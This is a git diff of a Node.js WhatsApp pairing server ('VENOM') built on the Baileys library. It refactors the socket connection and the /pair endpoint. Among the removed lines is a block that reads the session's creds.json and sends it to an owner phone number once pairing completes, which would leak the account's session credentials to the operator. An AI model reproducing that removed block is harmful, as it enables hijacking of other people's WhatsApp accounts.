@@ -6,8 +6,8 @@ const pino = require("pino")
 const {
 default: makeWASocket,
 useMultiFileAuthState,
-DisconnectReason,
-fetchLatestBaileysVersion
+fetchLatestBaileysVersion,
+DisconnectReason
 } = require("@whiskeysockets/baileys")
 
 const app = express()
@@ -18,13 +18,15 @@ if (!fs.existsSync(sessionPath)){
 fs.mkdirSync(sessionPath,{recursive:true})
 }
 
-async function startSock(){
+let sock
+
+async function connectSocket(){
 
 const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
 
 const { version } = await fetchLatestBaileysVersion()
 
-const sock = makeWASocket({
+sock = makeWASocket({
 logger:pino({level:"silent"}),
 auth:state,
 browser:["VENOM","CHROME","1.0.0"],
@@ -33,7 +35,7 @@ version
 
 sock.ev.on("creds.update", saveCreds)
 
-sock.ev.on("connection.update", async (update)=>{
+sock.ev.on("connection.update", (update)=>{
 
 const { connection, lastDisconnect } = update
 
@@ -42,44 +44,20 @@ if(connection === "close"){
 const reason = lastDisconnect?.error?.output?.statusCode
 
 if(reason !== DisconnectReason.loggedOut){
-startSock()
+connectSocket()
 }
 
-}else if(connection === "open"){
-
-console.log("✅ BOT CONNECTED")
-
-setTimeout(async()=>{
-
-try{
-
-let creds = fs.readFileSync(path.join(sessionPath,"creds.json"))
-
-await sock.sendMessage(
-process.env.OWNER_NUMBER + "@s.whatsapp.net",
-{
-document:creds,
-mimetype:"application/json",
-fileName:"creds.json"
-}
-)
-
-console.log("📩 Session Sent To Owner")
-
-}catch(e){
-console.log("❌ Error Sending Session")
 }
 
-},5000)
-
+if(connection === "open"){
+console.log("✅ BOT READY FOR PAIRING")
 }
 
 })
 
-return sock
 }
 
-let sock
+connectSocket() // 🔥 هنا الحل
 
 app.get("/pair", async (req,res)=>{
 
@@ -87,25 +65,19 @@ let number = req.query.number
 
 if(!number) return res.send("Enter Number")
 
-sock = await startSock()
-
-setTimeout(async()=>{
-
 try{
 
 let code = await sock.requestPairingCode(number)
 
-code = code?.match(/.{1,4}/g)?.join("-") || code
+code = code.match(/.{1,4}/g).join("-")
 
-res.send(`<h2 style="color:red">${code}</h2>`)
+res.send(code)
 
 }catch(e){
 
 res.send("Error: Connection Closed")
 
 }
-
-},3000)
 
 })
 
@@ -116,5 +88,5 @@ res.sendFile(__dirname + "/index.html")
 const PORT = process.env.PORT || 3000
 
 app.listen(PORT,()=>{
-console.log("🕷️ VENOM PAIR SERVER RUNNING")
+console.log("🕷️ SERVER RUNNING")
 })
